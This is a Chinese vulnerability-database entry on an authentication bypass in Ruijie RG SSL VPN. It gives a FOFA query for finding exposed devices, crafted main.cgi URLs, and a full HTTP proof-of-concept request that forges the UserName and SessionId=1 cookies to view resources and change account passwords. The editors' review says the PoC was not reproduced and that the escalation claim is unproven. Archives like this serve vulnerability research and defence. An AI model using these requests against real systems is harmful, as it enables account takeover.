---
source: "wy876 漏洞文库"
id: "vw-58f425c4b661d2e3b51a4f7a"
entity_id: "ve-58f425c4b661d2e3b51a4f7a"
schema_version: "1"
fofa_unverified: "icon_hash="
title: "锐捷RG SSL VPN 垂直越权漏洞"
product: "Ruijie SSL VPN"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "已知有效用户名，固定SessionId=1；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Ruijie/%E9%94%90%E6%8D%B7RGSSLVPN%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/tmgs3g967ixmiwam"
source_status: "recorded"
---

# 锐捷RG SSL VPN 垂直越权漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Ruijie SSL VPN
- 本文讨论：UserName/SessionId资源及账号越权
- 版本、权限与配置前提：已知有效用户名，固定SessionId=1；版本未知
- 资料类型：认证绕过重复；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 同740更完整原文，但缺截图与实际改密请求
- 称垂直越权却未证明低角色到高角色转换，更像已知用户名认证绕过/身份冒用
- sid1与1614345312混用，重复oper未解释
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 账号修改有效性/版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


**一、漏洞简介**

Ruijie SSL VPN 存在越权访问漏洞，攻击者在已知用户名的情况下，可以对账号进行修改密码和绑定手机的操作。并在未授权的情况下查看服务器资源

**二、影响版本**  
锐捷RG SSL VPN  
**三、资产测绘**

fofa`icon_hash="884334722" || title="Ruijie SSL VPN"`  
●登录页面

  
**四、漏洞复现**

```plain
/cgi-bin/main.cgi?oper=getrsc
```

直接访问，回显如下：


随后访问如下，UserName 参数为已知用户名 在未知登录用户名的情况下 漏洞无法利用(根据请求包使用Burp进行用户名爆破)

```plain
/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=name&sid=1614345312&oper=showres
```


<font style="color:rgb(0, 0, 0);">查看服务器资源</font><font style="color:rgba(0, 0, 0, 0.9);">POC：</font>

```http
GET /cgi-bin/main.cgi?oper=getrsc HTTP/1.1
Host: 127.0.0.1
Connection: close
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UserName=name; SessionId=1; FirstVist=1; Skin=1; tunnel=1
```


通过此方法知道用户名后可以通过漏洞修改账号参数，访问

```plain
/cgi-bin/main.cgi?oper=showsvr&encode=GBK&username=liuw&sid=1&oper=showres
```


点击个人设置跳转页面即可修改账号信息


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tmgs3g967ixmiwam>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
